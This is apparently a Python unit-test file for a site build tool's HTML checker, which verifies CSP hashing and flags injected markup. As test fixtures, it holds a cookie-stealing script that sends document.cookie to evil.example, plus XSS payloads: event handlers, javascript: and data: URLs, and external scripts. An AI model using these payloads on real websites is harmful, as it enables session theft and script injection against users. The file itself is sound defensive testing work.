import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import build
import htmlcheck

TEMPLATE = '''<!doctype html>
<html lang="{{lang}}">
<head>
<meta charset="utf-8">
<script>
  // theme
  document.documentElement.dataset.theme = "dark";
</script>
</head>
<body>{{content}}
<script>window.SITE = { prefix: "{{prefix}}", lang: "{{lang}}", built: "{{built}}" };</script>
<script defer src="{{prefix}}static/app.js"></script>
</body></html>
'''


def page(content):
    output = (TEMPLATE.replace("{{content}}", content).replace("{{prefix}}", "../")
              .replace("{{lang}}", "en").replace("{{built}}", "2026-10-13T00:00:00Z"))
    return build.with_csp(output, TEMPLATE, "../", "en", "2026-10-13T00:00:00Z")


class HtmlCheckTests(unittest.TestCase):
    def test_template_scripts_are_hashed_and_clean_page_passes(self):
        self.assertEqual(htmlcheck.check(page("<p>Hello</p>")), [])
        self.assertIn("Content-Security-Policy", page(""))
        self.assertIn("object-src 'none'", build.csp_content(set()))

    def test_script_from_content_gets_no_hash(self):
        output = page('<script>fetch("https://evil.example/?c=" + document.cookie)</script>')
        problems = htmlcheck.check(output)
        self.assertEqual(len(problems), 1)
        self.assertIn("inline script without a CSP hash", problems[0])

    def test_content_cannot_impersonate_a_template_script(self):
        # Same text as the template's SITE line but with another prefix: not trusted.
        output = page('<script>window.SITE = { prefix: "https://evil.example/", lang: "en", built: "x" };</script>')
        self.assertTrue(any("without a CSP hash" in problem for problem in htmlcheck.check(output)))

    def test_injection_vectors_are_reported(self):
        cases = {
            '<img src="x.png" onerror="alert(1)">': "event handler onerror",
            '<h2 onclick="alert(2)">Title</h2>': "event handler onclick",
            "<a href='javascript:alert(3)'>x</a>": "href=",
            '<a href=" JaVaScRiPt:alert(4)">x</a>': "href=",
            '<a href="data:text/html,<script>alert(5)</script>">x</a>': "data: URL",
            '<iframe src="https://evil.example"></iframe>': "<iframe>",
            '<object data="x.swf"></object>': "<object>",
            '<base href="https://evil.example/">': "<base>",
            '<script src="https://evil.example/x.js"></script>': "external script",
            '<script src="//evil.example/x.js"></script>': "external script",
            '<svg><a xlink:href="javascript:alert(6)">x</a></svg>': "xlink:href",
        }
        for markup, expected in cases.items():
            with self.subTest(markup=markup):
                problems = htmlcheck.check(page(markup))
                self.assertTrue(any(expected in problem for problem in problems), problems)

    def test_allowed_resources_pass(self):
        ok = ('<img src="data:image/svg+xml;base64,AAAA" alt="">'
              '<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>'
              '<a href="https://example.org/paper">paper</a>')
        self.assertEqual(htmlcheck.check(page(ok)), [])

    def test_redirect_stub_is_allowed_without_csp(self):
        stub = ('<!doctype html>\n<meta charset="utf-8">\n<meta http-equiv="refresh" content="0; url=new.html">\n'
                '<script>location.replace("new.html" + location.hash)</script>\n')
        self.assertEqual(htmlcheck.check(stub), [])
        self.assertTrue(htmlcheck.check(stub.replace("location.replace", "alert(1);location.replace")))

    def test_page_without_csp_fails(self):
        self.assertIn("missing Content-Security-Policy", htmlcheck.check("<!doctype html><p>x</p>"))


if __name__ == "__main__":
    unittest.main()
